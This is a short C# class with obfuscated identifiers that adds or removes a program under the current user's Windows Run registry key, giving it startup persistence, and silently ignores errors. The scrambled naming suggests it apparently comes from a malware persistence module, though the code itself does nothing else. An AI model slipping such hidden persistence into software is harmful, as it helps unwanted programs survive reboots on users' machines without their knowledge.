using Microsoft.Win32;

namespace EW5H3oYChfNlwZGh;

public class Autorun
{
	public static void set(bool JexbzSnRj_USS, string aOBfy4xadi3LIFPsQYQGUlaWq3xwctfxegar9A0d, string zdZG1VMy_ehxYh)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			if (JexbzSnRj_USS)
			{
				registryKey.SetValue(aOBfy4xadi3LIFPsQYQGUlaWq3xwctfxegar9A0d, zdZG1VMy_ehxYh);
			}
			else if (!JexbzSnRj_USS && registryKey.GetValue(aOBfy4xadi3LIFPsQYQGUlaWq3xwctfxegar9A0d) != null)
			{
				registryKey.DeleteValue(aOBfy4xadi3LIFPsQYQGUlaWq3xwctfxegar9A0d);
			}
			registryKey.Flush();
			registryKey.Close();
			registryKey = null;
		}
		catch
		{
		}
		aOBfy4xadi3LIFPsQYQGUlaWq3xwctfxegar9A0d = null;
		zdZG1VMy_ehxYh = null;
	}
}
